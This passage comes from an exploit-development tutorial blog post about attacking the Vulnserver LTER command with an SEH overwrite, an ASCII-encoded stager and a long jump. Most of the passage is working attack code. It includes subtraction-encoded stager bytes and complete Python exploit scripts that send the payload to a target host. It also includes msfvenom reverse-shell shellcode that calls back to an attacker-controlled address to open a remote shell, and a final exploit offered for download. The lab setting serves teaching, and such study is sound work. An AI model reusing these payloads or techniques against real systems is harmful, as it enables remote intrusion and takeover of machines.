``` console
$ python3 ~/Automatic-ASCII-Shellcode-Subtraction-Encoder/encoder.py -m -p -s
'\x83\xec\x02\x31\xff\x31\xdb\x53\x80\xc7\x04\x53\x89\xe3\x83\xc3\x64\x53\x47
\x57\xb8\x90\x2c\x25\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3' -v STAGER
...
Shellcode length: 234
Shellcode Output:

STAGER  = b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2b\x6f\x27\x21\x2d'
STAGER += b'\x30\x37\x26\x2b\x2d\x30\x76\x21\x23\x50\x25\x50\x50\x4a\x50\x25'
STAGER += b'\x2a\x2a\x30\x2a\x2d\x7f\x3e\x26\x7a\x2d\x3c\x7e\x22\x60\x2d\x46'
STAGER += b'\x72\x31\x65\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x4f'
STAGER += b'\x6f\x6f\x61\x2d\x39\x6f\x77\x62\x2d\x38\x60\x30\x33\x50\x25\x50'
STAGER += b'\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7b\x75\x33\x37\x2d\x67\x7e'
STAGER += b'\x7b\x27\x2d\x66\x7b\x24\x7c\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a'
STAGER += b'\x30\x2a\x2d\x2d\x28\x2a\x62\x2d\x3e\x22\x3d\x22\x2d\x31\x62\x51'
STAGER += b'\x24\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7f\x76\x24'
STAGER += b'\x7f\x2d\x79\x7f\x35\x3e\x2d\x7f\x26\x22\x7f\x50\x25\x50\x50\x4a'
STAGER += b'\x50\x25\x2a\x2a\x30\x2a\x2d\x24\x67\x23\x23\x2d\x30\x68\x71\x28'
STAGER += b'\x2d\x2c\x69\x66\x61\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a'
STAGER += b'\x2d\x33\x30\x7a\x5d\x2d\x70\x6c\x68\x26\x2d\x5e\x31\x42\x28\x50'
STAGER += b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2b\x2a\x2a\x22\x2d'
STAGER += b'\x21\x6e\x6d\x32\x2d\x31\x7b\x65\x7a\x50'
```

We need to align our `ESP` pointer again:

``` x86asm
push esp            ; Push the current value of ESP on the stack
pop eax             ; Pop it to EAX register
sub al,0x0b01       ; Substract 0x0b01 bytes from EAX
push eax            ; Push the resultant value of EAX to the stack
pop esp             ; Pop it back the ESP
```

And update our exploit with that. Remember to add a padding in the first
bytes, so our long jump lands there and the execution slides to our
stager:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

LONG_JUMP  = b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x62\x21\x22\x23\x2d'
LONG_JUMP += b'\x38\x25\x2b\x28\x2d\x67\x28\x22\x24\x50\x25\x50\x50\x4a\x50\x25'
LONG_JUMP += b'\x2a\x2a\x30\x2a\x2d\x42\x7f\x29\x73\x2d\x7f\x25\x69\x2d\x2d\x56'
LONG_JUMP += b'\x2d\x7b\x5f\x50'

STAGER  = b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2b\x6f\x27\x21\x2d'
STAGER += b'\x30\x37\x26\x2b\x2d\x30\x76\x21\x23\x50\x25\x50\x50\x4a\x50\x25'
STAGER += b'\x2a\x2a\x30\x2a\x2d\x7f\x3e\x26\x7a\x2d\x3c\x7e\x22\x60\x2d\x46'
STAGER += b'\x72\x31\x65\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x4f'
STAGER += b'\x6f\x6f\x61\x2d\x39\x6f\x77\x62\x2d\x38\x60\x30\x33\x50\x25\x50'
STAGER += b'\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7b\x75\x33\x37\x2d\x67\x7e'
STAGER += b'\x7b\x27\x2d\x66\x7b\x24\x7c\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a'
STAGER += b'\x30\x2a\x2d\x2d\x28\x2a\x62\x2d\x3e\x22\x3d\x22\x2d\x31\x62\x51'
STAGER += b'\x24\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7f\x76\x24'
STAGER += b'\x7f\x2d\x79\x7f\x35\x3e\x2d\x7f\x26\x22\x7f\x50\x25\x50\x50\x4a'
STAGER += b'\x50\x25\x2a\x2a\x30\x2a\x2d\x24\x67\x23\x23\x2d\x30\x68\x71\x28'
STAGER += b'\x2d\x2c\x69\x66\x61\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a'
STAGER += b'\x2d\x33\x30\x7a\x5d\x2d\x70\x6c\x68\x26\x2d\x5e\x31\x42\x28\x50'
STAGER += b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2b\x2a\x2a\x22\x2d'
STAGER += b'\x21\x6e\x6d\x32\x2d\x31\x7b\x65\x7a\x50'

PAYLOAD = (
    b'LTER .' +
    b'A' * 16 +
    b'\x54' +               # PUSH ESP
    b'\x58' +               # POP EAX
    b'\x66\x2d\x01\x0b' +   # SUB AX,0x0b01
    b'\x50' +               # PUSH EAX
    b'\x5c' +               # POP ESP
    STAGER +
    b'A' * (3554 - 4 - 79 - 16 - 8 - len(STAGER)) +
    # Align stack for our long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    LONG_JUMP +
    b'A' * (79 - 6 - len(LONG_JUMP)) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 1
    b'\x75\x08' +
    # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x53\x14' +       # ADD AX,0x1453
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    # Make EAX = '909080eb'
    b'\x25\x50\x50\x4A\x50' +   # AND EAX,504A5050
    b'\x25\x2A\x2A\x30\x2A' +   # AND EAX,2A302A2A
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
    # This will trigger our stager
    fd.recv(1024)
```

And check it:

<div class="imgblock">

![Stager
success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331206/blog/vulnserver-lter-seh/stager2_wzgle8.gif)

</div>

Weeeh\! Now to finish, we can create our shellcode and insert it on our
side channel created by the stager. As we now control the `recv()` call,
we are not limited by the bad chars\! Let’s do that:

``` console
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=4444 EXITFUNC=none -f python -v SHELL
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of python file: 1660 bytes
SHELL =  b""
SHELL += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
SHELL += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
SHELL += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
SHELL += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
SHELL += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
SHELL += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
SHELL += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
SHELL += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
SHELL += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
SHELL += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
SHELL += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
SHELL += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
SHELL += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
SHELL += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
SHELL += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
SHELL += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
SHELL += b"\x00\x12\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"
SHELL += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
SHELL += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
SHELL += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
SHELL += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
SHELL += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
SHELL += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
SHELL += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
SHELL += b"\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68\xa6"
SHELL += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
SHELL += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
```

Update our exploit:

``` python
import socket
import struct
import time

HOST = '192.168.0.20'
PORT = 9999

LONG_JUMP  = b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x62\x21\x22\x23\x2d'
LONG_JUMP += b'\x38\x25\x2b\x28\x2d\x67\x28\x22\x24\x50\x25\x50\x50\x4a\x50\x25'
LONG_JUMP += b'\x2a\x2a\x30\x2a\x2d\x42\x7f\x29\x73\x2d\x7f\x25\x69\x2d\x2d\x56'
LONG_JUMP += b'\x2d\x7b\x5f\x50'

STAGER  = b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2b\x6f\x27\x21\x2d'
STAGER += b'\x30\x37\x26\x2b\x2d\x30\x76\x21\x23\x50\x25\x50\x50\x4a\x50\x25'
STAGER += b'\x2a\x2a\x30\x2a\x2d\x7f\x3e\x26\x7a\x2d\x3c\x7e\x22\x60\x2d\x46'
STAGER += b'\x72\x31\x65\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x4f'
STAGER += b'\x6f\x6f\x61\x2d\x39\x6f\x77\x62\x2d\x38\x60\x30\x33\x50\x25\x50'
STAGER += b'\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7b\x75\x33\x37\x2d\x67\x7e'
STAGER += b'\x7b\x27\x2d\x66\x7b\x24\x7c\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a'
STAGER += b'\x30\x2a\x2d\x2d\x28\x2a\x62\x2d\x3e\x22\x3d\x22\x2d\x31\x62\x51'
STAGER += b'\x24\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7f\x76\x24'
STAGER += b'\x7f\x2d\x79\x7f\x35\x3e\x2d\x7f\x26\x22\x7f\x50\x25\x50\x50\x4a'
STAGER += b'\x50\x25\x2a\x2a\x30\x2a\x2d\x24\x67\x23\x23\x2d\x30\x68\x71\x28'
STAGER += b'\x2d\x2c\x69\x66\x61\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a'
STAGER += b'\x2d\x33\x30\x7a\x5d\x2d\x70\x6c\x68\x26\x2d\x5e\x31\x42\x28\x50'
STAGER += b'\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2b\x2a\x2a\x22\x2d'
STAGER += b'\x21\x6e\x6d\x32\x2d\x31\x7b\x65\x7a\x50'

SHELL =  b""
SHELL += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
SHELL += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
SHELL += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
SHELL += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
SHELL += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
SHELL += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
SHELL += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
SHELL += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
SHELL += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
SHELL += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
SHELL += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
SHELL += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
SHELL += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
SHELL += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
SHELL += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
SHELL += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
SHELL += b"\x00\x12\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"
SHELL += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
SHELL += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
SHELL += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
SHELL += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
SHELL += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
SHELL += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
SHELL += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
SHELL += b"\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68\xa6"
SHELL += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
SHELL += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# Create STAGE2 with the shellcode and pad the rest of the
# 1024 buffer with NOPs
STAGE2 = SHELL + b'\x90' * (1024 - len(SHELL))

PAYLOAD = (
    b'LTER .' +
    b'A' * 16 +
    b'\x54' +               # PUSH ESP
    b'\x58' +               # POP EAX
    b'\x66\x2d\x01\x0b' +   # SUB AX,0x0b01
    b'\x50' +               # PUSH EAX
    b'\x5c' +               # POP ESP
    STAGER +
    b'A' * (3554 - 4 - 79 - 16 - 8 - len(STAGER)) +
    # Align stack for our long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    LONG_JUMP +
    b'A' * (79 - 6 - len(LONG_JUMP)) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 1
    b'\x75\x08' +
    # JZ SHORT +0x6: If the previous jump didn't happen (ZF is 0), jump!
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250172B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x53\x14' +       # ADD AX,0x1453
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    # Make EAX = '909080eb'
    b'\x25\x50\x50\x4A\x50' +   # AND EAX,504A5050
    b'\x25\x2A\x2A\x30\x2A' +   # AND EAX,2A302A2A
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (4000 - 3554 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
    # This will trigger our stager
    fd.recv(1024)
    time.sleep(3)
    fd.sendall(STAGE2)
```

And check if we got a shell:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331202/blog/vulnserver-lter-seh/success_vaz7jm.gif)

</div>

Wonderful\! It was easy, isn’t it? No, it was not, but we learned a
lot\!

You can download the final exploit [here](exploit.py).

## Conclusion

Dealing with bad chars when exploiting is very common. Generally,
encoders from known tools like `msfvemon` will help us to overcome those
restrictions, but there are some picky applications that will make us
drive the extra mile, but it’s worth it.
